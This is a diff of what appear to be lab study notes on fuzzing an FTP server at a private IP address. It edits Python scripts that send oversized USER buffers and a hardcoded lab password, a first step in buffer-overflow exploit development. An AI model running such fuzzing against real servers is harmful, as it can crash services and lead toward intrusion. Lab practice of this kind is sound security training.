@@ -78,7 +78,7 @@ from urllib import response
 # define the variables to be sent to the server
 ip = '192.168.164.170'
 port = 21
-buffer = b"A" * 1000
+buffer = b"A" * 510
 payload = ""
 
 # create the socket to connect to the server
@@ -94,8 +94,9 @@ response = s.recv(1024)
 print(response)
 
 # because you have to enter the pass as well 
-s.send(b"PASS parrot\r\n")
+s.send(b"PASS PARROTASSASSIN15\r\n")
 s.close()
+
 ```
 
 ## Automation 
@@ -107,7 +108,8 @@ s.close()
 #!/usr/bin/python3
 
 import socket
-from time import sleep 
+from time import sleep
+from urllib import response 
 
 buffer = b"B" * 10
 x = 0
@@ -117,14 +119,11 @@ while True:
     print("Fuzzing " + str(len(buff)))
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connect = s.connect(('192.168.164.170', 21))
-    resp = s.recv(1024)
-    print(resp)
-
+    response = s.recv(1024)
+    print(response)
     s.send(b"USER " + buff + b"\r\n")
-    resp = s.recv(1024)
-
+    response = s.recv(1024)
     s.send(b"PASS PARROTASSASSIN15\r\n")
-
     s.close
     x = x + 100
     sleep(2)
